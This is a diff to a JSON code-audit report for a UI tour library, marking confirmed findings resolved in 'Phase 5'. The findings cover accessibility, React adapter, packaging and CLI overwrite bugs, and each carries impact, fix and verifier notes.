@@ -11,11 +11,11 @@
   },
   "counts": {
     "total": 357,
-    "P0": 3,
-    "P1": 60,
-    "P2": 135,
+    "P0": 1,
+    "P1": 43,
+    "P2": 123,
     "P3": 42,
-    "resolved": 117
+    "resolved": 148
   },
   "findings": [
     {
@@ -126,7 +126,7 @@
       "severity": "P0",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "<GuidePopover> renders a second popover on top of core's DefaultRenderer — two stacked aria-modal dialogs",
       "file": "packages/react/src/components/GuidePopover.tsx",
       "line": 37,
@@ -134,7 +134,8 @@
       "impact": "core/src/index.ts:161 installs the themed DOM renderer unconditionally: `const renderer = (config.renderer ?? new DefaultRenderer()) as DefaultRenderer`. DefaultRenderer.renderStep() creates its own `div.gf-popover` with `role=\"dialog\" aria-modal=\"true\"`, appends it to document.body and steals focus (`firstFocusable?.focus()`, default-renderer.ts:125). Following GuidePopover's own JSDoc therefore paints TWO visually identical popovers at the same computed position for every step, with two `aria-modal=\"true\"` dialogs in the a11y tree, and focus jumping into the core one while the React one holds the click handlers the user thinks they configured. Nothing in the React package, its README, or apps/docs tells the user to suppress the default renderer, and there is no documented no-op renderer to pass.",
       "fix": "Export a `NullRenderer` (or a `headless: true` config flag) from @guideflow/core and have `<GuidePopover>` assert on mount that `gf` was constructed with it — warn loudly otherwise. Update the JSDoc example and apps/docs/api/react/guide-popover.md to show `createGuideFlow({ renderer: new NullRenderer() })`. Simplest alternative: make `<GuidePopover>` call `gf.configure({ renderer: nullRenderer })` in a layout effect on mount and restore on unmount.",
       "effort": "M",
-      "verifierNote": "Verified end to end. core/src/index.ts:161 is verbatim `const renderer = (config.renderer ?? new DefaultRenderer()) as DefaultRenderer`, and DefaultRenderer._ensurePopover() (renderer/default-renderer.ts:147-154) creates `div.gf-popover` and appends it to document.body; renderStep() sets role=dialog/aria-modal=true (lines 94-95) and calls `firstFocusable?.focus()` (line 125). GuidePopover.tsx:120-137 portals a second `div.gf-popover` with role=dialog aria-modal=true into document.body at the same computed position. I searched for an escape: there is no no-op/headless renderer exported anywhere (`grep -rn \"Headless|NoopRenderer|headless\"` hits only two comments), TourProvider passes no renderer, and the JSDoc at GuidePopover.tsx:36-42 is quoted verbatim and does not tell the user to supply one. Two stacked dialogs confirmed."
+      "verifierNote": "Verified end to end. core/src/index.ts:161 is verbatim `const renderer = (config.renderer ?? new DefaultRenderer()) as DefaultRenderer`, and DefaultRenderer._ensurePopover() (renderer/default-renderer.ts:147-154) creates `div.gf-popover` and appends it to document.body; renderStep() sets role=dialog/aria-modal=true (lines 94-95) and calls `firstFocusable?.focus()` (line 125). GuidePopover.tsx:120-137 portals a second `div.gf-popover` with role=dialog aria-modal=true into document.body at the same computed position. I searched for an escape: there is no no-op/headless renderer exported anywhere (`grep -rn \"Headless|NoopRenderer|headless\"` hits only two comments), TourProvider passes no renderer, and the JSDoc at GuidePopover.tsx:36-42 is quoted verbatim and does not tell the user to supply one. Two stacked dialogs confirmed.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "api-keys-shipped-to-browser",
@@ -261,7 +262,7 @@
       "severity": "P0",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "Bridge postMessage of the step:enter payload throws DataCloneError and aborts every targeted tour on the page",
       "file": "packages/devtools/src/bridge.ts",
       "line": 111,
@@ -269,7 +270,8 @@
       "impact": "Core emits `this.emit('step:enter', { stepId, stepIndex, target })` (packages/core/src/engine/tour.ts:258-262) where `target` is a live `Element` (`_resolveTarget` returns `document.querySelector(step.target)`). `window.postMessage` uses the structured clone algorithm, which cannot clone DOM nodes, so this listener throws `DataCloneError` synchronously. `EventEmitter.emit` (packages/core/src/utils/emitter.ts:33) does `set.forEach((fn) => fn(payload))` with no try/catch, so the throw propagates into TourEngine's `_renderCurrentStep` try block, whose catch runs `this.emit('tour:error', …)` then `this._doEnd(false)` (tour.ts:266-272) — before `this._renderer.renderStep(...)` on line 265 ever executes. Net effect: with the extension installed, any tour step that has a `target` kills the tour instead of rendering, on every page. This is the single most damaging defect in the package and it is reproducible against the repo's own apps/demo, which sets `window.__guideflow`.",
       "fix": "In bridge.ts, serialize the payload before posting: deep-clone `args` through a sanitizer that replaces any `Node`/`Element`/`Function` with a descriptor string (e.g. `{ __el: el.tagName + '#' + el.id }`), and wrap the `postMessage` call in try/catch so a clone failure can never escape into the host page's emitter. Add the same guard to the `GF_FLOWS_LIST` and `GF_ACTIVE_TOUR_STATE` posts.",
       "effort": null,
-      "verifierNote": "Reproduced end-to-end. bridge.ts:109-114 posts `{event, args}` for every subscribed event. core/src/engine/tour.ts:258-262 emits `step:enter` with `target` from `_resolveTarget` (tour.ts:283-290 returns `document.querySelector(...)`, an Element). utils/emitter.ts:33 is `this._listeners.get(event)?.forEach((fn) => fn(payload))` — no try/catch, so the DataCloneError propagates. The emit sits inside the try opened at tour.ts:225, before `this._renderer.renderStep(...)` at line 265, so the catch at 266-273 emits tour:error and calls `_doEnd(false)`. apps/demo/src/main.tsx:100 sets `window.__guideflow`, and apps/demo/src/flows/onboarding.ts uses targeted steps, so this is reproducible in-repo. (The follow-on `tour:error` payload carries a DOMException, which IS structured-cloneable, so no secondary throw masks it.)"
+      "verifierNote": "Reproduced end-to-end. bridge.ts:109-114 posts `{event, args}` for every subscribed event. core/src/engine/tour.ts:258-262 emits `step:enter` with `target` from `_resolveTarget` (tour.ts:283-290 returns `document.querySelector(...)`, an Element). utils/emitter.ts:33 is `this._listeners.get(event)?.forEach((fn) => fn(payload))` — no try/catch, so the DataCloneError propagates. The emit sits inside the try opened at tour.ts:225, before `this._renderer.renderStep(...)` at line 265, so the catch at 266-273 emits tour:error and calls `_doEnd(false)`. apps/demo/src/main.tsx:100 sets `window.__guideflow`, and apps/demo/src/flows/onboarding.ts uses targeted steps, so this is reproducible in-repo. (The follow-on `tour:error` payload carries a DOMException, which IS structured-cloneable, so no secondary throw masks it.)",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "cli-docs-flags-all-wrong",
@@ -542,7 +544,7 @@
       "severity": "P1",
       "kind": "a11y",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "React <GuidePopover> never moves focus into the dialog at all",
       "file": "packages/react/src/components/GuidePopover.tsx",
       "line": 120,
@@ -550,7 +552,8 @@
       "impact": "GuidePopover.tsx contains no `.focus()` call, no `autoFocus`, and no focus-management `useEffect` — only the two positioning effects at lines 101-108. When a React tour starts, the dialog is portalled into `document.body` while focus stays on whatever button the user clicked to start the tour. A screen-reader user hears nothing: there is no live region and no focus move, so the popover is silently inserted and the virtual cursor stays where it was. A keyboard user must Tab through every remaining focusable element on the page to reach the tour's Next button. This is strictly worse than the core renderer, which at least focuses something, and the two renderers are documented as interchangeable.",
       "fix": "Add a `useEffect` keyed on `activeStep.step.id` that focuses the popover container (`tabIndex={-1}` on the wrapper) or the primary action button, saves the prior `document.activeElement`, and restores it in the cleanup. Share the implementation with the core renderer rather than duplicating it.",
       "effort": "M",
-      "verifierNote": "Read GuidePopover.tsx in full: role=dialog/aria-modal=true at 123-124, and `grep -rn '\\.focus()\\|autoFocus' packages/react/src packages/vue/src packages/svelte/src` returns nothing. The only effects are the two positioning ones at 101-108. No live region either (aria-live grep empty). Confirmed. Severity P1 for the same calibration reason as the core focus finding."
+      "verifierNote": "Read GuidePopover.tsx in full: role=dialog/aria-modal=true at 123-124, and `grep -rn '\\.focus()\\|autoFocus' packages/react/src packages/vue/src packages/svelte/src` returns nothing. The only effects are the two positioning ones at 101-108. No live region either (aria-live grep empty). Confirmed. Severity P1 for the same calibration reason as the core focus finding.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "rtl-double-flip",
@@ -625,7 +628,7 @@
       "severity": "P1",
       "kind": "gap",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "<GuidePopover> hardcodes skip/prev/next and ignores step.actions, content.html and step.media, which the core renderer honours",
       "file": "packages/react/src/components/GuidePopover.tsx",
       "line": 159,
@@ -633,7 +636,8 @@
       "impact": "`Step.actions?: StepAction[]` (core types/index.ts:69) lets a flow define arbitrary labelled buttons whose `action` string is dispatched through `gf.send()` — core's DefaultRenderer implements this at default-renderer.ts:162-190. `<GuidePopover>` never reads `activeStep.step.actions`, so any flow using custom FSM-event buttons renders the wrong three buttons and the branch is unreachable. Likewise `content.html` is silently dropped: line 154 renders only `{content.body && <p ...>{content.body}</p>}`, while DefaultRenderer falls back to a sanitized `content.html` block (default-renderer.ts:179-181) — a step authored with `{ html: '<ul>...' }` renders completely empty in the React popover. `step.media` (types/index.ts:67) is honoured by neither renderer.",
       "fix": "In GuidePopover, map `activeStep.step.actions` to buttons dispatching `gf.send(a.action)` with the same next/prev/skip/end special-casing as core's action handler (core/src/index.ts:179-187), and render `content.html` via `dangerouslySetInnerHTML` only after routing it through a shared exported sanitizer (export core's `_sanitizeHTML` so both renderers share one implementation). Either implement `step.media` in both renderers or delete the type.",
       "effort": "M",
-      "verifierNote": "GuidePopover.tsx:159-162 is verbatim and the whole footer (155-172) hardcodes skip/prev/next; `activeStep.step.actions` appears nowhere in the file. DefaultRenderer._buildHTML does honour step.actions at default-renderer.ts:162-165 and 186-190, and falls back to `this._sanitizeHTML(content.html)` at 179-181 — while GuidePopover.tsx:154 renders only `{content.body && ...}`, so `{ html: '<ul>…' }` yields an empty popover. `grep -n media` returns nothing in either renderer, confirming step.media (types/index.ts:67) is honoured by neither. Step.actions is at types/index.ts:69 as cited."
+      "verifierNote": "GuidePopover.tsx:159-162 is verbatim and the whole footer (155-172) hardcodes skip/prev/next; `activeStep.step.actions` appears nowhere in the file. DefaultRenderer._buildHTML does honour step.actions at default-renderer.ts:162-165 and 186-190, and falls back to `this._sanitizeHTML(content.html)` at 179-181 — while GuidePopover.tsx:154 renders only `{content.body && ...}`, so `{ html: '<ul>…' }` yields an empty popover. `grep -n media` returns nothing in either renderer, confirming step.media (types/index.ts:67) is honoured by neither. Step.actions is at types/index.ts:69 as cited.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-guidepopover-ignores-instance-i18n",
@@ -657,7 +661,7 @@
       "severity": "P1",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "<GuidePopover> positions in useEffect (paints at 0,0 for a frame) and never tracks scroll, contradicting its own API doc",
       "file": "packages/react/src/components/GuidePopover.tsx",
       "line": 101,
@@ -665,7 +669,8 @@
       "impact": "Two defects. (1) `position` initialises to `{ x: 0, y: 0, placement: 'bottom' }` (line 48) and is corrected in a passive `useEffect`, which runs *after* the browser paints — so every step transition flashes the popover at the top-left corner of the viewport for one frame before it jumps to the target. Measurement-then-position must run in `useLayoutEffect`. (2) Only `resize` is listened for. apps/docs/api/react/guide-popover.md:40 promises \"Handles positioning and scroll tracking automatically\" — there is no scroll listener, so any user scroll after the step renders leaves the `position: fixed` popover stranded while its target moves away underneath it. Core's DefaultRenderer has the same missing scroll listener, so this is a library-wide gap being advertised as a feature.",
       "fix": "Swap both effects to `useLayoutEffect`, and add `window.addEventListener('scroll', updatePosition, { passive: true, capture: true })` (capture so scrolls inside scroll containers are caught) alongside resize — mirroring what `HotspotManager` already does correctly at core/src/engine/hotspot.ts:119-121. Delete or implement the scroll-tracking claim in the docs.",
       "effort": "S",
-      "verifierNote": "GuidePopover.tsx:100-108 is verbatim: updatePosition runs in a passive useEffect and the only listener registered is 'resize'. Initial state is `{ x: 0, y: 0, placement: 'bottom' }` at line 48, so the first paint after each step:enter lands at viewport 0,0. guide-popover.md:40 is verbatim \"Handles positioning and scroll tracking automatically\". I checked core for a compensating listener: DefaultRenderer._position (default-renderer.ts:196-226) is called once from renderStep and registers no scroll or resize handler either, so the library-wide gap claim holds too."
+      "verifierNote": "GuidePopover.tsx:100-108 is verbatim: updatePosition runs in a passive useEffect and the only listener registered is 'resize'. Initial state is `{ x: 0, y: 0, placement: 'bottom' }` at line 48, so the first paint after each step:enter lands at viewport 0,0. guide-popover.md:40 is verbatim \"Handles positioning and scroll tracking automatically\". I checked core for a compensating listener: DefaultRenderer._position (default-renderer.ts:196-226) is called once from renderStep and registers no scroll or resize handler either, so the library-wide gap claim holds too.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-guidepopover-stays-visible-after-pause",
@@ -673,7 +678,7 @@
       "severity": "P1",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "<GuidePopover> does not subscribe to tour:pause, so gf.pause() hides the core popover but leaves the React one on screen",
       "file": "packages/react/src/components/GuidePopover.tsx",
       "line": 73,
@@ -681,7 +686,8 @@
       "impact": "`TourEngine.pause()` (core/src/engine/tour.ts:167-175) calls `this._spotlight.hide()` and `this._renderer.hideStep()` and emits only `tour:pause` — it deliberately does *not* emit `step:exit` so the flow position is preserved. GuidePopover, `<TourStep>` (TourStep.tsx:36-39) and `useTourStep` (use-tour-step.ts:35-42) all key off `step:exit`/`tour:abandon`/`tour:complete` and none of them listen to `tour:pause`. Result: calling `gf.pause()` hides the spotlight and the core popover but leaves the React popover and every `<TourStep>` body rendered — the exact opposite of what pause means. `resume()` re-emits `step:enter` so it happens to un-break itself, masking the bug in casual testing.",
       "fix": "Add `gf.on('tour:pause', () => setActiveStep(null))` and `gf.on('tour:resume', ...)` handling to GuidePopover, TourStep and useTourStep. Then expose pause/resume properly across all three adapters (see the pause/resume parity finding).",
       "effort": "S",
-      "verifierNote": "TourEngine.pause() at engine/tour.ts:167-175 reads exactly as described: it hides spotlight and renderer and emits only 'tour:pause' — no step:exit. GuidePopover.tsx:73-75 (verbatim) subscribes to step:exit/tour:abandon/tour:complete only; TourStep.tsx:36-39 and use-tour-step.ts:35-42 do the same; `grep tour:pause` finds no hit in packages/react/src. resume() at tour.ts:178-185 re-renders the current step, which does mask the bug. Fully reproduced."
+      "verifierNote": "TourEngine.pause() at engine/tour.ts:167-175 reads exactly as described: it hides spotlight and renderer and emits only 'tour:pause' — no step:exit. GuidePopover.tsx:73-75 (verbatim) subscribes to step:exit/tour:abandon/tour:complete only; TourStep.tsx:36-39 and use-tour-step.ts:35-42 do the same; `grep tour:pause` finds no hit in packages/react/src. resume() at tour.ts:178-185 re-renders the current step, which does mask the bug. Fully reproduced.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-no-use-client-boundary",
@@ -689,7 +695,7 @@
       "severity": "P1",
       "kind": "packaging",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "packages/react/src contains no 'use client' directive while the docs claim Next.js App Router support",
       "file": "packages/react/src/context.tsx",
       "line": 6,
@@ -697,7 +703,8 @@
       "impact": "apps/docs/guide/index.md:36 states \"**SSR safe** — every DOM access is guarded; works in Next.js App Router, Nuxt, and SvelteKit\". `grep -rn \"use client\" packages/react/src/` returns nothing, and the tsup banner (packages/react/tsup.config.ts) emits only `/* @guideflow/react — MIT License */`. Importing `TourProvider`, `useTour`, or any component from a Next.js App Router Server Component fails the build with \"You're importing a component that needs `createContext`. It only works in a Client Component but none of its parents are marked with 'use client'\". There is also no App Router / RSC guidance anywhere in apps/docs.",
       "fix": "Add `'use client'` as the first line of every file under packages/react/src (or emit it via `banner: { js: \"'use client';\" }` in tsup.config.ts — note tsup strips top-of-file directives during bundling, so the banner is the reliable route). Add an apps/docs/guide/nextjs.md showing the client-boundary wrapper pattern for TourProvider in a root layout.",
       "effort": "S",
-      "verifierNote": "`grep -rn \"use client\" packages/` returns nothing (exit 1, no matches) and packages/react/tsup.config.ts emits only the MIT banner — no directive-preserving config. context.tsx:6 does import createContext as quoted. apps/docs/guide/index.md:36 is verbatim the SSR/App-Router claim. Downgrading to P1: the package is not shipped-broken — the standard workaround (consumer adds 'use client' to their own wrapper) is one line and is how most React libs were consumed pre-directive; the defect is a real packaging/DX gap plus a false doc claim, not an unusable build."
+      "verifierNote": "`grep -rn \"use client\" packages/` returns nothing (exit 1, no matches) and packages/react/tsup.config.ts emits only the MIT banner — no directive-preserving config. context.tsx:6 does import createContext as quoted. apps/docs/guide/index.md:36 is verbatim the SSR/App-Router claim. Downgrading to P1: the package is not shipped-broken — the standard workaround (consumer adds 'use client' to their own wrapper) is one line and is how most React libs were consumed pre-directive; the defect is a real packaging/DX gap plus a false doc claim, not an unusable build.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-provider-never-destroys-instance",
@@ -705,7 +712,7 @@
       "severity": "P1",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "TourProvider never calls instance.destroy() — a document-level keydown listener and the popover DOM survive unmount",
       "file": "packages/react/src/context.tsx",
       "line": 34,
@@ -713,7 +720,8 @@
       "impact": "There is no `useEffect(() => () => gf.destroy(), [gf])`. When a tour is active, core has attached `document.addEventListener('keydown', this._keyboardHandler)` (core/src/engine/tour.ts:343) which maps ArrowRight/ArrowDown to `next()` and Escape to `skip()`, and DefaultRenderer has appended a `div.gf-popover` to `document.body`. Unmounting the provider mid-tour (route change in an SPA, a modal that hosts its own provider, a micro-frontend teardown) leaves both alive: arrow keys keep advancing an invisible tour and the orphaned popover keeps floating over the page at z-index 999999, swallowing clicks. @guideflow/svelte is the only adapter that exposes any teardown (`destroy()`).",
       "fix": "In context.tsx, add `useEffect(() => { if (instance) return; return () => gf.destroy() }, [gf, instance])` so provider-owned instances are destroyed but caller-supplied ones are left alone. Add a regression test that unmounts the provider mid-tour and asserts the keydown handler no longer advances the flow.",
       "effort": "S",
-      "verifierNote": "context.tsx:27-39 contains no useEffect at all — the quoted return is the entire body after useMemo, so gf.destroy() is never called. Verified the leak is real: TourEngine._attachKeyboard registers `document.addEventListener('keydown', this._keyboardHandler)` at engine/tour.ts:343 with ArrowRight→next and Escape→skip (lines 327-340), and it is only removed in _detachKeyboard, called from _doEnd (line 303) and destroy (line 188) — neither of which runs on unmount. DefaultRenderer's popover is likewise only removed in hideStep(). Svelte is indeed the only adapter exposing destroy() (svelte/src/index.ts:101-104)."
+      "verifierNote": "context.tsx:27-39 contains no useEffect at all — the quoted return is the entire body after useMemo, so gf.destroy() is never called. Verified the leak is real: TourEngine._attachKeyboard registers `document.addEventListener('keydown', this._keyboardHandler)` at engine/tour.ts:343 with ArrowRight→next and Escape→skip (lines 327-340), and it is only removed in _detachKeyboard, called from _doEnd (line 303) and destroy (line 188) — neither of which runs on unmount. DefaultRenderer's popover is likewise only removed in hideStep(). Svelte is indeed the only adapter exposing destroy() (svelte/src/index.ts:101-104).",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-useid-breaks-react-17",
@@ -721,7 +729,7 @@
       "severity": "P1",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "GuidePopover calls useId(), which does not exist in React 17 — a version inside the declared peer range",
       "file": "packages/react/src/components/GuidePopover.tsx",
       "line": 51,
@@ -729,7 +737,8 @@
       "impact": "packages/react/package.json:61 declares `\"react\": \"^17.0.0 || ^18.0.0 || ^19.0.0\"`. `useId` was introduced in React 18; on React 17 the named import resolves to `undefined` and rendering `<GuidePopover>` throws `TypeError: useId is not a function`. The same range problem applies to the `React.JSX.Element` return annotations used across context.tsx:27, GuidePopover.tsx:44, TourStep.tsx:30 and ConversationalPanel.tsx:40 — the `React.JSX` namespace does not exist in @types/react 17 (it was the global `JSX` there), so React 17 consumers cannot even type-check the package. Nothing in CI installs React 17, so this is invisible.",
       "fix": "Either drop `^17.0.0` from the peerDependencies range (React 17 support is unverifiable without a matrix job), or replace `useId()` with a module-local counter fallback (`const useIdCompat = React.useId ?? (() => useMemo(() => `gf-${++counter}`, []))`) and switch return annotations to the global `JSX.Element`. Add a CI job that installs react@17 / react@19 and runs `type-check`.",
       "effort": "S",
-      "verifierNote": "GuidePopover.tsx:8 imports useId from 'react' and lines 51-52 call it; package.json:61 declares the peer range `\"react\": \"^17.0.0 || ^18.0.0 || ^19.0.0\"` while devDependencies pin react ^18.2.0 and @types/react ^18.2.60 (lines 67,70), so React 17 is never exercised. useId is React 18+, and React.JSX.Element annotations do appear at context.tsx:27, GuidePopover.tsx:44, TourStep.tsx:30 and ConversationalPanel.tsx:40. Downgrading to P1: the runtime crash is confined to one optional component on a peer version nothing in the repo installs (hooks, TourProvider and TourStep work on 17), and the React.JSX d.ts problem is invisible under the near-universal skipLibCheck:true."
+      "verifierNote": "GuidePopover.tsx:8 imports useId from 'react' and lines 51-52 call it; package.json:61 declares the peer range `\"react\": \"^17.0.0 || ^18.0.0 || ^19.0.0\"` while devDependencies pin react ^18.2.0 and @types/react ^18.2.60 (lines 67,70), so React 17 is never exercised. useId is React 18+, and React.JSX.Element annotations do appear at context.tsx:27, GuidePopover.tsx:44, TourStep.tsx:30 and ConversationalPanel.tsx:40. Downgrading to P1: the runtime crash is confined to one optional component on a peer version nothing in the repo installs (hooks, TourProvider and TourStep work on 17), and the React.JSX d.ts problem is invisible under the near-universal skipLibCheck:true.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "svelte-no-components-no-tests",
@@ -1063,7 +1072,7 @@
       "severity": "P1",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "@guideflow/core declares \"sideEffects\": false while shipping CSS consumers must import — webpack will tree-shake the stylesheet away",
       "file": "packages/core/package.json",
       "line": 27,
@@ -1071,7 +1080,8 @@
       "impact": "`\"sideEffects\": false` is a blanket assertion over every file in the package, including `dist/styles/*.css`. webpack 5 (and therefore Next.js, CRA, Rspack) uses it to elide imports whose bindings are unused — and a bare `import '@guideflow/core/styles'` has no bindings. The result is a production build where the tour renders completely unstyled while the dev build looks fine, which is the hardest class of bug for a user to diagnose. Every documented integration hits this: README.md:87, README.md:121, README.md:170, README.md:210, apps/storybook/.storybook/preview.ts:2, and the code the CLI scaffolds at packages/cli/src/commands/init.ts:9.",
       "fix": "Change packages/core/package.json:27 to `\"sideEffects\": [\"**/*.css\", \"./dist/styles/*\"]`. Leave the other five packages at `false` — none of them ship CSS.",
       "effort": "S",
-      "verifierNote": "packages/core/package.json:27 is verbatim `\"sideEffects\": false,`. The package ships dist/styles/{index,tokens,themes,popover,dark,rtl,high-contrast}.css (I listed them) and every documented integration uses the bindingless `import '@guideflow/core/styles'` — README.md:87/121/170/210, apps/storybook/.storybook/preview.ts:2, packages/cli/src/commands/init.ts:9 (CORE_TEMPLATE line 9). A blanket `sideEffects: false` is exactly what webpack 5 uses to elide such imports; the standard fix is `\"sideEffects\": [\"*.css\"]`. No guard exists anywhere in the manifest."
+      "verifierNote": "packages/core/package.json:27 is verbatim `\"sideEffects\": false,`. The package ships dist/styles/{index,tokens,themes,popover,dark,rtl,high-contrast}.css (I listed them) and every documented integration uses the bindingless `import '@guideflow/core/styles'` — README.md:87/121/170/210, apps/storybook/.storybook/preview.ts:2, packages/cli/src/commands/init.ts:9 (CORE_TEMPLATE line 9). A blanket `sideEffects: false` is exactly what webpack 5 uses to elide such imports; the standard fix is `\"sideEffects\": [\"*.css\"]`. No guard exists anywhere in the manifest.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "e2e-axebuilder-does-not-exist",
@@ -1130,7 +1140,7 @@
       "severity": "P1",
       "kind": "packaging",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "package.json advertises a programmatic `exports` entry but tsup has dts:false, so consumers get no types",
       "file": "packages/cli/package.json",
       "line": 34,
@@ -1138,7 +1148,8 @@
       "impact": "`packages/cli/tsup.config.ts:5` sets `dts: false`, and there is no `types`/`typings` field, so `import { PushOptions } from '@guideflow/cli'` resolves to an untyped module. `push.ts:8` exports `PushOptions` publicly, and the demo had to hand-duplicate it: `apps/demo/src/App.tsx:27` reads `/** Mirrors PushOptions from @guideflow/cli (which ships no .d.ts currently). */` followed by a copy of the interface — while apps/demo/src/App.tsx:834 tells readers it is \"Typed by `PushOptions` from `@guideflow/cli`\", which is false. Worse, the `\".\"` export actually resolves to the bin entry, which calls `program.parseAsync(process.argv)` at module scope (index.ts:50) — importing the package as a library executes the CLI.",
       "fix": "Either drop the `exports` map entirely (it is a bin-only package) and keep `bin` only; or, if a programmatic API is intended, split `src/api.ts` from `src/index.ts` (bin), point `exports[\".\"]` at the API entry with `types`, and set `dts: true` in tsup.config.ts:5.",
       "effort": "S",
-      "verifierNote": "package.json:34-38 verbatim; tsup.config.ts:6 `dts: false`; no `types`/`typings` field anywhere in the manifest. `\".\"` and `bin.guideflow` both point at ./dist/index.js, and index.ts:50 calls `program.parseAsync(process.argv)` at module scope — so importing the package as a library does execute the CLI. push.ts:8 exports PushOptions, and apps/demo/src/App.tsx:26-31 hand-duplicates it under the comment '/** Mirrors PushOptions from @guideflow/cli (which ships no .d.ts currently). */' while App.tsx:834 tells the reader it is 'Typed by PushOptions from @guideflow/cli'. All quotes verified."
+      "verifierNote": "package.json:34-38 verbatim; tsup.config.ts:6 `dts: false`; no `types`/`typings` field anywhere in the manifest. `\".\"` and `bin.guideflow` both point at ./dist/index.js, and index.ts:50 calls `program.parseAsync(process.argv)` at module scope — so importing the package as a library does execute the CLI. push.ts:8 exports PushOptions, and apps/demo/src/App.tsx:26-31 hand-duplicates it under the comment '/** Mirrors PushOptions from @guideflow/cli (which ships no .d.ts currently). */' while App.tsx:834 tells the reader it is 'Typed by PushOptions from @guideflow/cli'. All quotes verified.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "cli-zero-tests",
@@ -1179,7 +1190,7 @@
       "severity": "P1",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "`guideflow export foo.json` overwrites the user's input file in place, minified",
       "file": "packages/cli/src/commands/export.ts",
       "line": 59,
@@ -1187,7 +1198,8 @@
       "impact": "`.json` is an accepted input extension (line 33), but the regex `/\\.(ts|js)$/` does not match a path ending in `.json`. So for `guideflow export my-tour.json` with no `-o`, `outPath === src`. The file is read (line 34), `JSON.parse`d, and re-`JSON.stringify`d back over itself — and because `--pretty` defaults to `false` (line 21), the user's hand-formatted, version-controlled flow JSON is destructively minified to a single line with no backup, no confirmation, and a green `✓ Exported flow to my-tour.json` success message. There is also no `existsSync` guard on `outPath` in any branch, so an explicit `-o` silently clobbers whatever is there.",
       "fix": "In export.ts:59 compute the default output as `src.replace(/\\.(ts|js|json)$/, '') + '.flow.json'`, and add an explicit guard: if `resolve(outPath) === src`, error out. Add an `existsSync(outPath)` check that requires `--force` (or prompts) before overwriting any existing file.",
       "effort": "S",
-      "verifierNote": "Lines 59-61 verbatim. `.json` is accepted at line 33, and /\\.(ts|js)$/ cannot match a path ending in '.json' (it ends in 'on'), so outPath === src. `--pretty` defaults false (line 21). No existsSync guard on outPath in any branch (existsSync is used only on the input at line 25). Downgrading severity: the file is JSON.parse'd then JSON.stringify'd, so semantic content and key order survive — the loss is formatting/whitespace in a version-controlled file, not data destruction, and it is recoverable via git. A wrong-by-construction output path on an accepted input type is a serious defect, not shipped-broken-or-exploitable."
+      "verifierNote": "Lines 59-61 verbatim. `.json` is accepted at line 33, and /\\.(ts|js)$/ cannot match a path ending in '.json' (it ends in 'on'), so outPath === src. `--pretty` defaults false (line 21). No existsSync guard on outPath in any branch (existsSync is used only on the input at line 25). Downgrading severity: the file is JSON.parse'd then JSON.stringify'd, so semantic content and key order survive — the loss is formatting/whitespace in a version-controlled file, not data destruction, and it is recoverable via git. A wrong-by-construction output path on an accepted input type is a serious defect, not shipped-broken-or-exploitable.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "guideflow-config-ts-documented-never-exists",
@@ -1212,7 +1224,7 @@
       "severity": "P1",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "`init` always prompts for the output directory, so it can never run non-interactively even with every flag supplied",
       "file": "packages/cli/src/commands/init.ts",
       "line": 80,
@@ -1220,7 +1232,8 @@
       "impact": "The framework question has `when: !opts.framework` (line 78) but the outputDir question has no `when`, so it is always asked. `guideflow init --dir ./src --framework react` — a fully specified invocation — still blocks on a prompt. In a non-TTY context (CI, Docker build, `npx` inside a script, an agent harness) inquirer's input prompt has no stdin to read and the command hangs or throws, and there is no `--yes`/`--non-interactive` escape hatch anywhere in the package.",
       "fix": "Add `when: !opts.dir || opts.dir === '.'` is not sufficient since `.` is the default — instead detect whether `--dir` was explicitly passed (Commander's `initCommand.getOptionValueSource('dir') === 'cli'`) and skip the prompt, and short-circuit the whole `inquirer.prompt` call when `!process.stdin.isTTY` or `--yes` is present, falling back to flag values/defaults.",
       "effort": "S",
-      "verifierNote": "init.ts:80-85 verbatim; the framework question carries `when: !opts.framework` (line 78) and the outputDir question carries no `when`, so inquirer.prompt is always entered. There is no --yes/--non-interactive option (only --dir and --framework at lines 66-67), so a fully-specified `guideflow init --dir ./src --framework react` still blocks. I did not execute it in a non-TTY, so 'hangs or throws' is the only unverified detail; either way it cannot complete unattended."
+      "verifierNote": "init.ts:80-85 verbatim; the framework question carries `when: !opts.framework` (line 78) and the outputDir question carries no `when`, so inquirer.prompt is always entered. There is no --yes/--non-interactive option (only --dir and --framework at lines 66-67), so a fully-specified `guideflow init --dir ./src --framework react` still blocks. I did not execute it in a non-TTY, so 'hangs or throws' is the only unverified detail; either way it cannot complete unattended.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "init-clobbers-existing-files",
@@ -1228,7 +1241,7 @@
       "severity": "P1",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "`init` overwrites existing guideflow.ts / my-tour.ts / GuideFlowProvider.tsx with no check or prompt",
